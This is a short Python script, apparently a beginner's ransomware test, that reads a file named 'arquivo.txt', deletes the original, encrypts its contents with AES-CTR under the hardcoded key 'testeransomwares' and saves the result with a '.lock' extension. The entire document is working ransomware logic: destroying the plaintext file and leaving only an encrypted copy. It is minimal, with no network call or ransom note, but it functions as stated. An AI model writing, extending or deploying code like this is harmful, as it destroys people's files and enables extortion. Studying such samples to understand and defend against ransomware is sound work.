import os
import pyaes

name = "arquivo.txt"
file = open(name, "rb")
data = file.read()
file.close()
os.remove(name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(data)

new_file = name + ".lock"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()